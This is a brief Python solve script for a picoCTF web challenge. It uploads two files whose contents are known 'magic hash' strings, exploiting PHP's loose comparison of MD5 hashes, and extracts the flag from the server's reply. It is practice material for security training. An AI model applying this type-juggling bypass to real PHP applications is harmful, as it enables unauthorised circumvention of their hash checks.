import requests
import re

url = "http://mercury.picoctf.net:50970"

res = requests.post(f'{url}/index.php', files={
    "file1": ('file1.pdf', b'240610708', 'application/pdf'),
    "file2": ('file2.pdf', b'QLTHNDT', 'application/pdf'),
    'submit': (None, 'Upload')
})

print(re.findall(r'(picoCTF\{.+?\})', res.text)[0])